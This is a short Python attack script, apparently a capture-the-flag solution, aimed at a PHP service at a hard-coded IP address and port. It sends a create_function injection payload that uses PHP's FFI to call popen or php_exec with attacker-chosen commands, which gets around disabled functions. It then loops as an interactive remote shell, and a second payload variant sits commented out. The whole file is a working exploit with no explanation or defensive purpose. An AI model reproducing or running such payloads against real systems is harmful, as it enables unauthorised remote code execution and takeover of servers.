import requests

url = "http://173.82.206.142:8004/"

# data = {"fighter": "create_function", "fights": "", "invincibly": """}$e=FFI::cdef("void *popen(char*,char*);\\nvoid pclose(void*);\\nint fgetc(void*);","libc.so.6");$o = $e->popen($_REQUEST['cmd'],"r");$d="";while(($c=$e->fgetc($o))!=-1){$d.=str_pad(strval(dechex($c)),2,"0",0);}$e->pclose($o);echo hex2bin($d);/*"""}
data = {"fighter": "create_function", "fights": "", "invincibly": """}$e=FFI::cdef("int php_exec(int type, char *cmd);");$e->php_exec(3,$_REQUEST['cmd']);/*"""}

while 1:
    cmd = input("cmd:>")
    res = requests.post(url, data=data, params={"cmd": cmd})
    result = res.text.split("-->")[1]
    print(result)
